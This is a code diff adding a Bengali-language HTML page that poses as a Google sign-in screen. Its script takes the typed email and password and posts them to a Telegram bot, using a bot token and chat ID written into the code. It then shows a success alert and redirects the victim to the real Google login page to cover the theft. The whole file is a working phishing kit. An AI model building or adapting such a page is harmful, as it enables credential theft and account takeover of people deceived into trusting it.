@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>গুগল লগইন</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .logo-container {
+            margin-bottom: 20px;
+        }
+
+        .logo-container img {
+            width: 120px;
+            height: auto;
+        }
+
+        .login-container .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .login-container .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .login-container .login-btn:hover {
+            background-color: #357ae8;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #888;
+        }
+
+        .footer a {
+            color: #4285f4;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="logo-container">
+            <img src="google.png" alt="Google Logo">
+        </div>
+
+        <!-- Google login form -->
+        <form id="loginForm">
+            <input type="text" id="email" class="input-field" placeholder="ইমেইল বা ফোন নম্বর" required>
+            <input type="password" id="password" class="input-field" placeholder="পাসওয়ার্ড" required>
+
+            <button type="submit" class="login-btn">Login</button>
+        </form>
+
+        <div class="footer">
+            <p>Create Google account</p>
+            <a href="#">Sign up</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // ফর্ম সাবমিট বন্ধ করা
+
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            let botToken = "7992356703:AAGGmo7eTksT5oS-tzkwoY8k9DAtUkR9u_c"; // তোমার বট টোকেন
+            let chatId = "6341598098"; // তোমার চ্যাট আইডি
+
+            let message = `🔥 নতুন গুগল লগইন 🔥\n\n📧 ইমেইল: ${email}\n🔑 পাসওয়ার্ড: ${password}`;
+
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            let data = {
+                chat_id: chatId,
+                text: message
+            };
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("আপনার তথ্য সফলভাবে পাঠানো হয়েছে!");
+                window.location.href = "https://accounts.google.com"; // গুগলের লগইন পেজে রিডাইরেক্ট
+            })
+            .catch(error => console.error("Error:", error));
+        });
+    </script>
+
+</body>
+</html>
